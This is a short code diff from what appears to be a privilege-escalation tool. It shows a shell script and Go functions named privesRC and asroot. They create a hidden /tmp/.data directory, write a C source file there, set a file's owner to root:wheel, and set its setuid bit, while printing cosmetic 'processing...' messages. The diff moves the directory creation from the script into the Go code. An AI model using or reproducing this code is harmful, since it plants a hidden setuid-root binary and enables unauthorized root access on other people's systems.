@@ -209,7 +209,6 @@ sleep 1
 echo "processing..."
 sleep 2
 echo "..."
-mkdir /tmp/.data
 sudo chown root:wheel /tmp/.data/temp
 sudo chmod u+s /tmp/.data/temp
 echo "success" >> /tmp/.data/status
@@ -586,6 +585,10 @@ func privesRC(filepath string) {
 
 func asroot() {
 	// make a temporary outfile
+	err := os.Mkdir("/tmp/.data", 0755)
+	if err != nil {
+		fmt.Println("Error")
+	}
 	f, err := os.Create("/tmp/.data/temp.c")
 
 	if err != nil {
